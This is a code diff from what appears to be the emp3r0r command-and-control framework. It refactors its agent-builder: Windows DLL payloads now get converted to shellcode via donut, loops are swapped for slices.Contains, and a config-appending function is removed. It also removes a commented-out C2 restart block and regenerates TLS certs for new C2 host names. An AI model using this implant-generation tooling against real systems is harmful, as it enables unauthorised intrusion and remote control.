@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"slices"
 	"time"
 
 	"github.com/fxamacker/cbor/v2"
@@ -130,7 +131,7 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 	// done
 	logging.Successf("Generated %s from %s and %s",
 		outfile, stubFile, live.EmpConfigFile)
-	if payload_type == PayloadTypeWindowsExecutable {
+	if payload_type == PayloadTypeWindowsExecutable || payload_type == PayloadTypeWindowsDLL {
 		// generate shellcode for the agent binary
 		donut.DonoutPE2Shellcode(outfile, arch_choice)
 	}
@@ -160,12 +161,7 @@ func isArchValid(payload_type, arch_choice string) bool {
 	default:
 		list = Arch_List_All
 	}
-	for _, a := range list {
-		if arch_choice == a {
-			return true
-		}
-	}
-	return false
+	return slices.Contains(list, arch_choice)
 }
 
 func generateFilePaths(payload_type, arch_choice string, now time.Time) (stubFile, outfile string) {
@@ -227,24 +223,6 @@ func readAndEncryptConfig() ([]byte, error) {
 	return encryptedBytes, nil
 }
 
-func appendConfigToPayload(file string, sep, config []byte) (err error) {
-	bin_data, err := os.ReadFile(file)
-	if err != nil {
-		err = fmt.Errorf("failed to read file %s: %v", file, err)
-		return
-	}
-	toWrite := append(bin_data, sep...)
-	toWrite = append(toWrite, config...)
-	toWrite = append(toWrite, sep...)
-	err = os.WriteFile(file, toWrite, 0o755)
-	if err != nil {
-		err = fmt.Errorf("failed to save final agent binary: %v", err)
-		return
-	}
-
-	return
-}
-
 func MakeConfig(cmd *cobra.Command) (err error) {
 	cc_host, _ := cmd.Flags().GetString("cc")
 	indicator_url, _ := cmd.Flags().GetString("indicator")
@@ -279,14 +257,8 @@ func MakeConfig(cmd *cobra.Command) (err error) {
 	logging.Printf("C2 server name: %s", live.RuntimeConfig.CCAddress)
 	existing_names := transport.NamesInCert(transport.ServerCrtFile)
 	cc_hosts := existing_names
-	exists := false
-	for _, c2_name := range existing_names {
-		if c2_name == live.RuntimeConfig.CCAddress {
-			exists = true
-			break
-		}
-	}
-	// if user is requesting a new server name, server cert needs to be re-generated
+
+	exists := slices.Contains(existing_names, live.RuntimeConfig.CCAddress)
 	if !exists {
 		logging.Warningf("Name '%s' is not covered by our server cert, re-generating",
 			live.RuntimeConfig.CCAddress)
@@ -298,23 +270,6 @@ func MakeConfig(cmd *cobra.Command) (err error) {
 		if err != nil {
 			return fmt.Errorf("failed to generate certs: %v", err)
 		}
-		// TODO: restart C2 server via operator API
-		// // err = network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
-		// if err != nil {
-		// 	return fmt.Errorf("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
-		// 		err, live.RuntimeConfig.CCAddress)
-		// } else {
-		// 	logging.Warningf("Restarting C2 TLS service at port %s to apply new server cert", live.RuntimeConfig.CCPort)
-
-		// 	c2_names := transport.NamesInCert(transport.ServerCrtFile)
-		// 	if len(c2_names) <= 0 {
-		// 		return fmt.Errorf("no valid host names in server cert")
-		// 	}
-		// 	name_list := strings.Join(c2_names, ", ")
-		// 	logging.Infof("Updated C2 server names: %s", name_list)
-		// 	// go server.StartTLSServer()
-		// 	// TODO: restart C2 server via operator API
-		// }
 	}
 
 	// CC indicator
